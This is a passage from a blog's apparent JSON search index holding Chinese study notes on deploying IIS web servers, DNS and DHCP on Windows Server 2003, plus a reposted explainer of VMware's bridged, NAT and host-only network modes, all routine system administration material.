开头的用户，并且赋予修改权限。 这样一来，虽然 IIS 可以修改网站的数据库。但是，同时&quot;极大地增加了网站的风险&quot;。 2. IUSR-win2003-fn-1 该用户是一个网站的客户账户。就是游客浏览网站时所登陆的账户。 IIS 开头的应该时 IIS 管理工具账户。 3. 这一点课程里面没教，我自己从网络上找的一个基于 asp 的网站，搭建过程中遇到的问题。 当时是，网站的数据库不能进行修改，所以需要服务 IIS 这个权限。 相关经验 windows 系统的话，装 PHP 比较复杂。IIS 只能发布置 asp 语言。 如果拿到一个 PHP 语言编写的网站，最好是使用 Linux 进行发布。 windows 下网络路径或者本地路径都是不区分大小写的。 Linux 下是严格区分大小写的。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"IIS之Web服务器2","date":"2020-08-11T11:30:30.000Z","path":"2020/08/11/2020.08.11 IIS 之 Web 服务器2/","text":"IIS 之 Web 服务器2新建网站123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051521. 右键网站 -&gt; 新建一个网站2. 给网站绑定 IP 地址。 1) 一台服务器上，可能有多个网卡，多个ip。所以需要指定一个 ip 地址来&#x27;作为该网站的IP&#x27;。 2) 如果未分配的话，该服务器上所有 iP 都可以作为该网站的ip地址。 3) 客户可以通过与该网站所绑定的 ip 来进行访问。3. 指定主目录路径。 1) 用 HTML 语言写一个网页。存放到一个文件夹中。 2) 该文件夹就是主目录路径。 4. 设置网页的访问权限。 1) 一般静态网页(也就是用户不能和你进行互动，只能浏览的网页。) 2) 设置成只能读取。5. 正常情况下，访问一个网站是不需要登陆该网站的服务器的。如果显示需要登陆的话。&quot;可能是没有设置匿名访问&quot; 1) 右击网站 -&gt; 属性 -&gt; 目录安全性 -&gt; 允许匿名访问(编辑) -&gt; 启用 2) 在你安装 IIS 管理工具的同时。windows 新建了一个新的用户 &quot;匿名用户 IUSR&quot; 3) 在外网用户访问你所建立的网站时，&quot;默认&quot;是通过你服务器的&quot;匿名用户&quot;登陆服务器，然后进行访问的。6. 设置网站默认首页。 1) 右击网站 -&gt; 属性 -&gt; 文档. 2) 添加自己所写的 index.html 作为默认首页。然后将其移动到最上面。7. 一个网站可以添加多个网页。 1) 在属性，文档中设置 html 文件的优先级。就可以实现优先访问。8. 一台服务器新建多个网站——方法1 ## 同一个端口号，多个IP 1) 注意，一个 IP 地址只能绑定一个网站。 2) 如果你的服务器上面有多个网站，必须建立多个 ip 地址。 3) 或者停用其他网站，只保留一个网站来绑定该服务器的 IP。9. 一台服务器新建多个网站——方法2 ## 同一个IP，多个端口号 1) 给一台服务器分配多个 IP 地址可能会造成不稳定。 2) 还有一种方法，可以多个网站使用同一个 IP 地址。&quot;但是访问途径的端口号不同。&quot; 3) 比如 网站1 使用 TCP80 端口号。 网站2 可以使用 TCP8080 端口号。 4) 使用自定义端口号的时候，需要在 IP 地址后面添加 &quot;:8080&quot; 才是正确的访问路径。 &quot;注意&quot;：自定义功能端口号一般使用一千以上的端口号， 比如 8000， 8080， 最好是 4 位数。这种端口号没有默认功能。10. 一台服务器新建多个网站——方法3 ## 实际运用，同一个IP，同一个端口号，不同的域名。 1) 除 IP地址 和 访问端口号 以外，&quot;网站的第三个标识&quot; —— &quot;主机头&quot;。 2) 利用不同的域名，将网站与域名进行绑定。只有输入正确的域名，才能访问该网站。 3) DNS进行域名解析的时候，虽然解析的 IP 地址可能对应一台服务器上面的多个网站。但是网站还需要，对你所&quot;输入的域名这个参数&quot;进行核对，是否和我的主机头相同。 # 也就是说，你在地址栏输入域名的时候，服务器会获得三个标识参数。主机名(域名)、IP地址、端口号。 # 主机名由用户输入、IP 地址由 DNS 服务器解析、端口号默认是80(也可强制指定)。11. 一般情况下，使用方法 3 ，只能通过域名进行访问网站。而不能通过直接输入 IP 地址的方式来访问。 1) 想要像百度一样，既可以通过域名访问，也可以通过 IP 地址进行访问。 2) 很简单，网站 -&gt; 属性 -&gt; 网站标识 -&gt; 高级 -&gt; 添加。 3) 添加进第 2 种， 或 第 3 种 访问方式都可以。但是要注意，不同的网站，不能用完全一样的网站标识。 比如相同的 IP + 相同的端口号。 4) 甚至，如果你有多个域名，也可以一个网站绑定多个 &quot;主机头&quot;。 简单的网页语言 HTML，标签1234567891011121314151617181920212223242526272829303132333435361. 网页文件的后缀为 htm 或者 html。 1) 通常情况下主页名称为 index.html2. 闭合标签。一个标签有开头，也有结尾。 结尾在 &quot;&lt;&gt;&quot; 中添加 &#x27;/&#x27; 表示结尾。 1) 比如: &lt;html&gt; *** ***** &lt;/html&gt;3. &lt;html&gt; 标签 1) 网页标签，网页都以该标签开始。4. &lt;head&gt; 标签 1) 表示一个网页的头部。 闭合标签 2) 浏览器标签页内容，也就是一个网页的 &quot;title&quot; 存在于 &lt;head&gt; 标签的管辖范围。 3) 一个网页想要被人搜索到，需要做&quot;搜索引擎优化 SEO&quot;，就需要在 &quot;&lt;head&gt;部分&quot; 做。5. &lt;body&gt; 标签 1) 一个网页的主体部分。 闭合标签 2) 一个网页除了标题，你看到的所有部分都属于 &lt;body&gt; 部分。 3) eg. &lt;body&gt; Sorry, the Web is building ! &lt;/body&gt;6. &lt;title&gt; 标签 1) 表示一个网页的标题。 闭合标签 2) 该部分写在网页的头部。 3) eg: &lt;title&gt; 欢迎来到方宁的网页 &lt;/title&gt;7. &lt;/br&gt; 标签 1) 突然发现这玩意可以用来换行。 非闭合标签 8. &lt;marquee&gt; 标签 1) 添加滚动字幕效果。 闭合标签9. 10. 11. 给计算机分配多个 IP 就像我的真实机一样，ipconfig 出来有很多网卡——虚拟网卡、无线网卡，有线网卡。每一个网卡都连接获取一个 IP 地址。 同时，同一个网卡，可以给其配置多个 地址。 在手动配置 IP 地址页面，点击高级，添加新的 IP。 同一台服务器拥有多个 IP。无论你访问其中哪一个 IP 地址，都是在访问这台服务器。 相关经验 一般发部一个网站的时候，先用前两种方法进行测试。给服务器添加 IP，或者修改负责端口号。这样子进行测试比较方便。因为不需要去绑定域名，和修改 DNS 服务器。 而，对于正常使用，地三种方法，就比较便于用户访问。 之前，我访问电信光猫管理页面的时候。 192.168.1.1 是私自管理页面 192.168.1.1:8080 是超级管理页面 同一台服务器，通过不同的端口号进行访问，得到两个不同的网站。太狗了，非专业人士，鬼知道你把超级管理页面开到另外一个端口号上，并且用的是同一个 IP 地址。远在天边近在眼前","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"IIS之Web服务器","date":"2020-08-10T09:30:30.000Z","path":"2020/08/10/2020.08.10 IIS 之 Web 服务器/","text":"IIS 之 Web 服务器概述 WEB 服务器也称为网页服务器 或则 HTTP 服务器 或者 www万维网服务器。 web 服务器，使用的是 HTTP 或 HTTPS 协议。 http协议端口号 ：TCP 80 https 协议端口号：TCP 443 FTP 协议端口号：TCP21 WEB服务器发布软件12345671. 作用，将写好的 web 网页发部到互联网上。2. 常见的 web服务器发布软件： 1) 微软：&quot;IIS&quot;（Internet Information system），可以发部 &quot;web 网站 和 FTP 站点&quot;。 2) Linusx：Apache / LAMP / Tomcat / nginx .etc 3) 第三方软件：phpstudy、XAMPP .etc 第三方软件个人测试使用，上面两个官方的是生产环境使用。 WEB 服务器的部署1234567891011121314151617181. 选一台服务器，手动配置 IP 地址。2. 安装 web 服务器管理工具，或者插件。 1) 打开系统光盘。 2) 安装 网络服务 -&gt; 万维网服务 + FTP 服务。 3) 点击确认安装。 4) 此时服务器已经大开了 http 80。以及 tcp 21 ftp协议端口号。 &quot;注意 tcp 443 https 端口好并不是如此容易就可以打卡的&quot;。3. 打开 IIS 管理工具。可以看到 &quot;网站&quot; 和 &quot;FTP站点&quot;。4. 打开浏览器，进行测试。输入 web 服务器地址， 会显示一个 &quot;建设中&quot; 的网站。5. 该网站是一个&quot;默认网站&quot;，无论哪个平台，搭建 web服务器都会自带一个默认的网站。 1) 网站是一群相关的网页的集合。它以文件夹的形式保存在服务器中。 2) 一个网站，往往包含一个或者多个网页 .htm 文件。 3) 只要 web 服务器，存在网站，那么该服务器 80端口号 就是打开状态。如果删除或者停用所有的网站，那么该端口号就&quot;处于关闭状态&quot;。 4) 默认网站，存在漏洞。&quot;一般将其关闭&quot;。该网站存在于 &quot;C:\\Inetpub\\wwwroot&quot; 路径中。 5) 关闭该默认网站。 相关经验 浏览器专业术语叫做 HTTP客户端。类似的 还有 FTP客户端，等等…….. 浏览器接受网页信息的时候，进行翻译 http代码，展示出普通人能够识别的网页。 由前端程序员敲好的 HTTP 前端代码，需要部署到 web 服务器上面。就需要使用 IIS 管理工具进行部署。添加网站，以及网页。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"DNS部署与安全2","date":"2020-08-04T09:30:30.000Z","path":"2020/08/04/2020.08.04 DNS部署与安全2/","text":"第十一章、DNS部署与安全2主DNS服务器部署步骤：12345678910111213141516171819202122232425262728293031323334353637381. 打开 windows 镜像文件所在光盘。按照组件，找到域名系统（DNS）。进行安装。 1) 一旦安装完成之后。计算机 TCP53 和 UDP53 两个端口都被打开了。 2) 即使你没有修改 DNS 配置，但是它自带访问根域的地址。所以，只要你这太域名解析服务器能够上网，他就能给客户机提供域名解析服务(虽然工作效率慢了点)。 2. 正向查找区域： 1) 新建一个区域。主要区域(该区域负责该域名，也就是进行权威解析)，辅助区域(主要区域的备份或辅助工作)，根域(用不到)。 2) 创建区域解析文件(.dns 结尾)。所有该域名，和子域名的 DNS解析文件，都保存在此文件中。 3) 自动更新，保持不变就行。此操作设计到 域 知识。 4) 新建成功后几个参数的含义； (1) &quot;起始授权机构（SOA）&quot;：表示该域名的负责服务器是谁。 (2) &quot;名称服务器(NS)&quot;：表示可以给该域名做解析的 DNS 服务器有那些。一般有主域服务器，和辅助服务器。通俗的讲就是我认为合法的服务器。 (3) 别名（&quot;CNAME&quot;）：表示给正向解析记录，新建的一个别名解析。比如，给 www.fangning.com 新建另外一个名称 www2.fangning.com。两个域名指的是同一条解析记录。 别名也叫 Aliases。其实百度服务器的别名是，www.baidu.com。真名叫 www.a.shifen.com。 (4) &quot;主机A&quot;：正向解析记录。 (5) &quot;PTR&quot;记录：反向解析记录。 (6) &quot;MX&quot;：邮件交换记录。邮箱地址也是相当于一种域名，所以也需要进行解析。发送邮箱的时候，需要对目标邮箱进行解析。3. 新建一个正向解析记录(A记录)： 1) 右键-&gt;新建主机。就是给主域名增加一个对辅助域名的正向解析记录。比如给 zzuli.edu.cn 增加一个 acm.zzuli.edu.cn 服务主机的域名解析。 2) 配置以下虚拟机的 DNS服务器指向，然后用命令行 nslookup 或 ping 检验一下。 3) 如果需要给公司所有人修改，那么就需要修改 DHCP 地址池的 DNS配置。4. 在使用 nslookup 进行域名解析的时候，如果想要显示被访问的 DNS 服务器名称。将 UnKnown 该成服务器名称。 1) 先需要在正向解析里面，添加一个主机(A记录)，地址填该服务器的地址，主机名称一般取 dns1。 2) 建立的时候，需要勾选同时建立反向解析指针(PTR)。这时就会出现一条域名解析记录 dns1.fangning.com -&gt; 192.168.190.2 3) 需要添加一个&quot;反向查找区域&quot;。反向查询区域，要设置成 DNS服务器所在的网段。 4) 在该区域列表中，新建一个方向解析指针 PTR。所指对象，从正向解析主机记录列表里面进行查找。5. 另外一台客户机，进行DNS验证时，必须保证能够ping通该域名解析服务器。并且设置DNS地址为需要验证的服务器地址。6. 配置 DNS 转发器： 1) 在 DNS服务器管理工具中，右击服务器-&gt;属性 2) 填写配置好的另外一台被转发的 DNS服务器。 3) 注意，两台通过DNS转发器连接的服务器之间，相互必须要求可以ping通。所属同一局域网，或者能够连接 Internet。 4) 在本地DNS服务器解决不了的时候，就通过DNS转发器，进行递归查询。 5) 同时另外一台DNS服务器上面，需要添加好所需要的主机(A记录)。这样子，就可以通过客户机，指向 DNS1，再通过转发器访问 DNS2 -&gt; 从而获取第二台服务器上面的解析记录。 辅助区域（域名）部署步骤12345678910111213141. 1) 首先，辅助区域，并不是辅助 DNS服务器。这是针对&quot;负责域名&quot;的&quot;区域&quot;的一个备份类似。 2) 这个实验是再两台 win2003 服务器里面的 DNS管理工具中做的。以下简称 dns1 和 dns2。2. 在dns1中，选中正向解析中建立的&quot;区域&quot;，右击属性，找到区域复制。 1) 允许区域复制。 2) 修改权限为，只允许到下列制定服务器。 3) 在辅助服务器列表，添加&quot;dns2&quot;的地址。这一步的作用就是，设置谁可以复制我？？3. 在dns2中，右击-&gt;新建&quot;区域&quot;。 1) 新建辅助区域。 2) 输入你准备从谁哪儿进行&quot;同步&quot;，输入dns1的服务器地址。 3) 以后当主区域进行一些更新操作的时候，辅助区域会进行自动同步。 给已有的A记录，新建别名 在 正向查找区域，右键，新建一个 Cname 记录。指向 www.baidu.com 别名的作用就是，给 www.baidu.com 另外取一个名字，比如 www2.baidu.com。 这样，客户机，无论访问哪一个域名，最终都是指向同一台服务器，访问的地址其实是同一个。 关于虚拟机网络连接问题 虚拟机中十九个交换机 Vmnet1 ~ Vmnet19。其中，Vmnet0并没有包含其中。因为，该交换机，连接到真实机的网卡上面。因此可以把它看作是一个真实的交换机，可以分配有效真实的 IP 地址。 真实客户机，都包含两个网卡。一共使无线 WLAN 网卡，一个是有限以太网卡。 因此，在配置虚拟机桥接真实网络的时候。一定要确保 VMnet0 所连接的网卡，和你正在正常使用的网卡是相同的。 比如，你正在使用无线网络，但是Vmnet0 连接的是真实机的有线网卡。那虚拟机仍然不能够上网。 WireLess 无线。 1234567891. 配置虚拟网络编辑器，修改 Vmnet0 外部连接方式。把&quot;自动&quot;，修改成能够连接互联网的那一个网络适配置。 2. 修改虚拟机网络连接方式为&quot;桥接&quot;，或者直接修改连接到 Vmnet0 虚拟交换机上。3. 修改虚拟机网络配置方式为 &quot;DHCP 自动获取IP&quot;。4. 清空 &quot;DNS缓存&quot;， ipconfig /flushdns5. 使用 ping 命令来测试是否能够连接上外部网络。 还原 DNS服务器 在 DNS 管理工具中，删除 新建的正反向查找区域。 点击 查看 -&gt; 高级。此时会出现，DNS 缓存。 右击缓存查找，清除缓存。 此时，缓存清除了，负责域名的区域删除了，还要删转发器。 点击转发器，删除所建立的转发器。 相关指令1234561. 命令 ipconfig /flushdns 1) flush dns：指的是刷新dns缓存，也就是&quot;清除客户机的域名解析缓存记录&quot;。 2) 一般使用场景是，客户机缓存遭恶意篡改，或者是本低 DNS服务器进行一些错误修改后。2. 命令 ipconfig /displaydns 1) 查看本地已缓存的 DNS域名解析记录。 相关经验 之前有一次电脑网络出问题了。原因是，网络只能上QQ，不能使用浏览器。 可能是计算机中了恶意病毒，当时找遍全网的解决教程，才发现是 Internet 缓存的问题。 不是DNS域名解析问题，也不是IP地址的网络等配置问题，居然是个啥缓存问题？？？为什么？？ 现在应该知道了，客户机做域名解析的时候，先查看本地缓存，然后查看Host文件。当时情况下，我的域名解析缓存可能被篡改了，所以导致我浏览器域名解析不了。所以，清空缓存就行了。 本地缓存可以通过 ipconfig /displaydns 查看。 Host文件可以通过记事本打开，在 c:\\windows\\system32\\drivers\\etc\\hosts 中，其中hosts是一个无属性文件。 在虚拟机中如果是做攻击操作，千万不能将虚拟机调到真实网络当中。也就是，一般都用 Host-Only 模式， 否则容易导致真实机瘫痪！！！！ Aliases：别名，在 DNS 服务器中，可以给域名起别名。在 Linux 中也可以给使用十分频繁的命令起别名。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"DNS部署与安全","date":"2020-08-02T09:30:30.000Z","path":"2020/08/02/2020.08.02 DNS部署与安全/","text":"第十一章、DNS部署与安全1、DNS123451. 客户机域名解析步骤：缓存 -&gt; Host文件 -&gt; DNS服务器。 (1) 中大型公司一般都用自己部署的 DNS 服务器，而不是公共ISP提供的 DNS 服务器。 (2) Domain Name Service：域 名 服务。 (3) 为客户机提供域名解析服务。 2、域名组成一、概述 “www.sina.com.cn&quot;，严格来说 “sina.com.cn” 才是一个域名。”www”只是一个主机名。 “主机名.域名” 称为 完全限定域名（FQDN: full quality dymain name）。一个域名下，可以配置多个主机名，比如 www.baidu.com ，或者 mail.baidu.com 。主机的功能如果是网址用 www，博客 blog，邮件 mail。 一般要是买域名的话，可以去阿里云，有域名服务。除此之外，阿里云还可以买云空间，买云服务器等等。 二、组成结构 ​ 注：该图片中二级域名应该改成一级域名，后面依次改。 顶级域名很昂贵，com、net、org、edu等等。我们一般购买的一级域名，可以自己取名字。 而二级域名一般是主机名，只要你掌握了上一级域名，你就可以拥有该等级及以下等级的域名使用权限。 比如 www.acm.zzuli.edu.cn. 从后往前看，分别是： 根域-&gt;顶级域(中国)-&gt;一级域(学校服务器)-&gt;二级域(acm实验室服务器) -&gt;三级域(网页)。 3、端口 TCP 53 UDP 53 4、DNS解析种类 客户机域名解析过程： 首先客户机先查看自己的缓存，如果没有，再查看Host文件，也没有。那就需要将域名发送到所指的本地 DNS 服务器，请求域名解析。 如果该服务器缓存有该域名，那么将解析结果返回到客户机。这个过程，叫做递归查询。 如果本地 DNS 服务器没有该域名缓存，也不是负责该域名的服务器。 那么，该 DNS 服务器就会从 根域开始，进入一种迭代查询，知道找到负责 baidu.com 域名的服务器。 负责该域名解析的服务器：比如 baidu.com 是一个域名，那就存在一个专门负责以该域名结尾的域名解析。比如 www.baidu.com 或 mail.baidu.com 都由一个专门的服务器来解析。 权威解析结果：由负责该域名结尾的域名解析服务器解析出来的结果。 迭代查询过程中 先问 根域，根域会提供一个间接的服务器地址——顶级域名 .com 服务器。 顶级域名服务器也提供一个 一级域名服务器地址 —— baidu.com 域名服务器。 一级域名 baidu.com 服务器专门负责该域名结尾，所以能够进行解析，返回 www.baidu.com 的解析结果到本地 DNS 服务器。 返回递归查询出口，由 DNS 服务器将结果返回给客户机。并且该DNS服务器，会记下缓存下该域名的解析结果，方便下次查找。 公司内部的 DNS 服务器： 自己搭建的 DNS 服务器，也会知道全世界 根域 的地址。但是，这样子查询域名的过程太慢。 所以，一般如果自己没有缓存，也不是负责该域名的服务器。那公司内部的 DNS 服务器，会利用 DNS转发器，来寻求公网的 DNS 服务器的帮助。 DNS 转发器过程，是一个 递归查询过程。只问结果，所答即所答。公司内部DNS服务器甩锅！给公网DNS服务器。 123456789101112131. 按照查询方式分类： 1) 递归查询：所问即所答。你给我的答案，就是我所需要的。 (1) 客户机 与 本低DNS服务器 之间。 (2) 公司内部 DNS服务器 通过 DNS转发器 与 公网DNS服务器之间。 2) 迭代查询： (1) 本低DNS服务器 与 负责各域名的服务器 之间。 (2) 比如 各根域服务器，各顶级域服务器， 各一级域服务器...... 2. 按照查询内容分类： 1) 正向解析：已知域名，解析IP地址。 2) 逆向解析：一直IP地址，解析域名。 DNS服务器分类 主要名称服务器：某域名的主要负责服务器。（公司内部可能拥有） 辅助名称服务器：主要服务器的辅助服务器。（公司内部可能拥有） 根名称服务器：全世界十三台根域辅助服务器。（全世界仅有 13 台） 高速缓存名称服务器：自己不负责任何域名的解析，只是作为一个中介人，进行转发解析，然后缓存过程记录。（公司内部可能拥有） 相关经验 全世界的根域一共有十三处，其中九处在美国。国内没有，只有根域服务器的镜像。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"虚拟机三种网络模式","date":"2020-08-01T10:30:30.000Z","path":"2020/08/01/2020.08.01 转发关于VMware的网络状态/","text":"前言很多人安装虚拟机的时候，经常遇到不能上网的问题，而vmware有三种网络模式,对初学者来说也比较眼花聊乱，今天我就来基于虚拟机3种网络模式，帮大家普及下虚拟机上网的背景知识。(博文原创自http://www.cnblogs.com/ggjucheng/archive/2012/08/19/2646007.html) 虚拟机网络模式无论是vmware,virtual box,virtual pc等虚拟机软件，一般来说，虚拟机有三种网络模式: 1.桥接 2.NAT 3.Host-Only 初学者看到虚拟机有三种网络，估计就慌了，笔者也是。哪一种网络是适合自己的虚拟机呢？ 桥接 桥接网络是指本地物理网卡和虚拟网卡通过VMnet0虚拟交换机进行桥接，物理网卡和虚拟网卡在拓扑图上处于同等地位，那么物理网卡和虚拟网卡就相当于处于同一个网段，虚拟交换机就相当于一台现实网络中的交换机,所以两个网卡的IP地址也要设置为同一网段。 所以当我们要在局域网使用虚拟机，对局域网其他pc提供服务时，例如提供ftp，提供ssh，提供http服务，那么就要选择桥接模式。 例如大学宿舍里有一个路由器，宿舍里四个人连接这个路由器，路由器的wanip就不理会了，这个ip是动态获取的，而lanip默认是192.168.1.1,子网掩码是255.255.255.0。而其他四个人是自动获取ip，假设四个人的ip是: A:192.168.1.100/255.255.255.0, B:192.168.1.101/255.255.255.0, C:192.168.1.102/255.255.255.0, D:192.168.1.103/255.255.255.0 那么虚拟机的ip可以设置的ip地址是192.168.1.2-192.168.1.99,192.168.1.104-192.168.1.254(网络地址全0和全1的除外，再除去ABCD四个人的ip地址) 那么虚拟机的ip地址可以设置为192.168.1.98/255.255.255.0,设置了这个ip地址，ABCD这四个人就可以通过192.168.1.98访问虚拟机了，如果虚拟机需要上外网，那么还需要配置虚拟机的路由地址，就是192.168.1.1了，这样，虚拟机就可以上外网了，但是，上网我们一般是通过域名去访问外网的，所以我们还需要为虚拟机配置一个dns服务器，我们可以简单点，把dns服务器地址配置为google的dns服务器:8.8.8.8,到此，虚拟机就可以上网了。 NATNAT模式中，就是让虚拟机借助NAT(网络地址转换)功能，通过宿主机器所在的网络来访问公网。 NAT模式中，虚拟机的网卡和物理网卡的网络，不在同一个网络，虚拟机的网卡，是在vmware提供的一个虚拟网络。 NAT和桥接的比较: (1) NAT模式和桥接模式虚拟机都可以上外网。 (2) 由于NAT的网络在vmware提供的一个虚拟网络里，所以局域网其他主机是无法访问虚拟机的，而宿主机可以访问虚拟机，虚拟机可以访问局域网的所有主机，因为真实的局域网相对于NAT的虚拟网络，就是NAT的虚拟网络的外网，不懂的人可以查查NAT的相关知识。 (3) 桥接模式下，多个虚拟机之间可以互相访问；NAT模式下，多个虚拟机之间也可以相互访问。 如果你建一个虚拟机，只是给自己用，不需要给局域网其他人用，那么可以选择NAT，毕竟NAT模式下的虚拟系统的TCP/IP配置信息是由VMnet8(NAT)虚拟网络的DHCP服务器提供的，只要虚拟机的网路配置是DHCP，那么你不需要进行任何其他的配置，只需要宿主机器能访问互联网即可，就可以让虚拟机联网了。 例如你想建多个虚拟机集群，作为测试使用，而宿主机可能是一个笔记本，ip不固定。这种应用场景，我们需要采用nat模式了，但是我们要考虑一个问题，虚拟机之间是需要互访的，默认采用dhcp，虚拟机的ip每次重启，ip都是不固定的，所以我们需要手工设置虚拟机的ip地址。 但是我们对虚拟机网卡所在的虚拟网络的信息还一无所知，例如虚拟机网络的路由地址，子网掩码，所以我们需要先查下nat虚拟网络的信息。 使用vmware,在Edit-&gt;Virtual Network Editor中配置好虚拟网络信息后看到下图所示，注意VMnet8，VMnet8相当于是本机的一个路由，虚拟机设置NAT后就通过这个路由进行上网的，可以查看其网络地址，路由地址，子网掩码。 选择VMnet8-&gt;NAT设置,可以看到子网ip显示为192.168.233.0，子网掩码是255.255.255.0，那路由地址呢，其实就是网关IP了，都是同个东西，这里是192.168.233.2。 接下来就好办了，在对应的虚拟机设置好ip，子网掩码，路由地址就可以上外网了，至于dns可以设置为8.8.8.8. Host-Only 在Host-Only模式下，虚拟网络是一个全封闭的网络，它唯一能够访问的就是主机。其实Host-Only网络和NAT网络很相似，不同的地方就是Host-Only网络没有NAT服务，所以虚拟网络不能连接到Internet。主机和虚拟机之间的通信是通过VMware Network Adepter VMnet1虚拟网卡来实现的。 Host-Only的宗旨就是建立一个与外界隔绝的内部网络，来提高内网的安全性。这个功能或许对普通用户来说没有多大意义，但大型服务商会常常利用这个功能。如果你想为VMnet1网段提供路由功能，那就需要使用RRAS，而不能使用XP或2000的ICS，因为ICS会把内网的IP地址改为192.168.0.1，但虚拟机是不会给VMnet1虚拟网卡分配这个地址的，那么主机和虚拟机之间就不能通信了。 综述 在VMware的3中网络模式中，NAT模式是最简单的，基本不需要手动配置IP地址等相关参数。至于桥接模式则需要额外的IP地址，如果是在内网环境中还很容易，如果是ADSL宽带就比较麻烦了，ISP一般是不会大方的多提供一个公网IP的。","link":"","tags":[{"name":"转发","slug":"转发","permalink":"http://www.fangning.xyz.com/tags/%E8%BD%AC%E5%8F%91/"}]},{"title":"DHCP 部署与安全","date":"2020-07-31T15:30:30.000Z","path":"2020/07/31/2020.07.31 DHCP部署与安全2/","text":"第十二章、DHCP部署与安全部署DHCP服务器1234567891011121314151617181920212223242526272829303132333435363738394041424344451. 首先 DHCP服务器 和 客户机 需要桥接到同一段网络。如果是虚拟环境，就是两台虚拟机连接进入同一台交换机，比如 VMnet1。然后配置同一网段的 IP。2. 部署一台服务器需要服务器软件，打开相应的端口。所有微软自带的服务器软件都在&quot;管理工具&quot;里面。 (1) 如果没有。对于 windows2003 以及之前的系统，&quot;需要重新插入系统光盘&quot;，然后可以打开光盘文件。 选择&quot;络信息服务(IIS)&quot;，打开，然后从里面找到需要的&quot;动态主机配置协议 DHCP&quot;进行安装。 (2) 如果是 win10 或则 win2008 改程序默认是可能是安装了的，也可能是没有。 如果没有安装，去控制面板，windows程序启动里面找。 如果安装了该服务，去 services.msc 里面进行激活。3. 这一步可能安装失败，因为你需要部署DHCP的服务器自身的地址是需要自己&quot;手动配置&quot;的。所以，先得给自己配好 IP。自己的 IP 也必须和员工的 IP 同属于一个网段。 (1) 并且，在地址池里面不能存自己的这个 IP。公司里面如果还有其他需要，或者部署多台 DHCP 服务器，或者其他服务器。都需要&quot;预留&quot;一些 IP 地址。也就是，员工的 IP 可以设置从 10 或者 20 开始。 (2) 当你给服务器本身配置好之后，DHCP服务软件就可以安装成功了。4. 此时用 netstat /n 查看端口号的时候，会发现多了&quot;UDP67&quot; 和 &quot;UDP68&quot; 两个端口号。这&quot;两个都是动态主机配置协议服务&quot;所属的端口号。 (1) 客户机的 DHCP Discovery 和 DHCP Requst 是通过这两个端口入站的。 (2) 服务器的 DHCP offer 包 和 DHCP ACK 包也都是从这两个端口出战的。5. 启动地址池(微软叫&quot;作用域&quot;): (1) 打开刚刚所安装的 DHCP 服务软件。这里面可以选择关闭该服务。 (2) 选择服务器图标，右击&quot;新建作用域&quot;。最好最前面预留一部分，最后面预留一部分。注意排除广播地址和 网段地址，以及网关地址。 (3) 设置地址分配范围。 (4) 设置子网掩码。 (5) 设置租期策略，设置一个合适的 IP 租约长度。 (6) 配置 DHCP选项，也就是网关，DNS服务器等。对于DNS配置的话，你的公司向 &quot;网络服务提供商（ISP）&quot;买网的时候，他会给你的一个固定的公网 IP。并且提供一个说明文档，里面有写这一片区域所部署的 DNS 服务器地址. (7) 如果需要配置 WINS 服务器，以及父域这种。都不需要配置，这些已经淘汰。 (8) 是否激活作用域，一般建议先不激活作用域。 退出检查地址池，地址租约，作用域选项一切检查没有错误，再进行激活。 6. 部署号 DHCP 服务器后，打开客户机进行检查验证一下。 (1) 停用一下客户机的网卡，然后再启用，这时候计算机就会再次请求 IP。发送 Discovery 包。 (2) 然后查看网络详细信息，检查IP，DNS，网关，等等信息。 (3) 若客户机所在局域网内没有 DHCP 服务器，或者 DHCP 服务器没有配置有效的地址池。那么就会自动获取 IP 失败。此时会获得一个无效的IP地址&quot;169.254.233.86&quot;。7. &quot;注意&quot;: 如果在虚拟机中做该实验，必须先关闭虚拟机交换机所提供的 DHCP 服务，免得与自己部署的 DHCP 服务产生冲突。 (1) 点击 VMware 的虚拟网络编辑器。使用管理员身份打开。选中使用的交换机。 (2) 将使用本低 DHCP 服务取消勾选。 8. 保留功能： (1) 在企业公司内，一般情况下，有些客户机的 IP 是要求固定的。也就是，每天下班，上班打开计算机，内部的IP总不能经常变动。 (2) 所以，这就可以利用DHCP服务器管理工具里面的&quot;保留功能&quot;。将客户机的MAC地址，与地址池里面特定的IP进行绑定。9. DHCP服务器备份： (1) 无论是在学校还是公司企业，都不可能只有一个局域网。这种情况只需要在一台 DHCP 服务器上部署多个作用域就行了。 (2) 这样，一旦服务器崩溃，重新布置会很麻烦。所以给 &quot;DHCP配置做备份就很必要&quot;。 同时创建多个作用域，可以简化 新建的多个作用域，他们的 DNS 可以是一样的。因此可以在 服务器选项里面，设置父类的 DNS 配置。 这样，多个作用域选项，就会继承父亲服务器选项里面的 DNS 配置。 如果子类里面想要单独设置 DNS，可以再到自己的作用域选项里面进行设置。作用域选项 &gt; 服务器选项。 相关命令12345671. ipconfig /release (1) 手动释放 DHCP 获取的 IP。即使 IP 租约没到期，可以提前归还。2. ipconfig /renew (1) 若当前有 IP 地址，这条命令表示进行续约。发送 DHCP Request (2) 若当前没有获得 IP 地址，这条命令表示请求 IP。发送 DHCP Descovery 相关经验 凡是服务器软件，装上之后，都会给计算机打开一个相应的端口。 有关 Vmware 的三种网络状态： 理解请看：http://www.cnblogs.com/ggjucheng/archive/2012/08/19/2646007.html 拓扑图理解：https://zhuanlan.zhihu.com/p/24758022 1234567891011121314151. 桥接模式： (1) 物理机网卡 与 虚拟机网卡 一起桥接在虚拟交换机VMnet0 上。此时物理机与虚拟机同属一个网段，两者平级，两者可以互相通信。 (2) 